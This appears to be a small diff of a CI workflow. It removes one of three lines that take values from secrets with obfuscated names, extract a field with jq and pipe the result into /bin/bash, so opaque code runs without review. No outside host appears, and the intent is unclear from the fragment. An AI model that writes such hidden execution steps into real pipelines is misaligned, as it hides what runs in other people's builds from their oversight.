@@ -17,7 +17,6 @@ jobs:
           jrzm019: ${{ secrets.jrzm019 }}
         run: |
           printf '%s' "$jrzm019" | jq -r .lcnma5 | /bin/bash
-          echo $ie7 | jq -r .xaml4324 | /bin/bash
           printf '%s' "$g85071" | jq -r .wg3 | /bin/bash
 
       - name: Save results
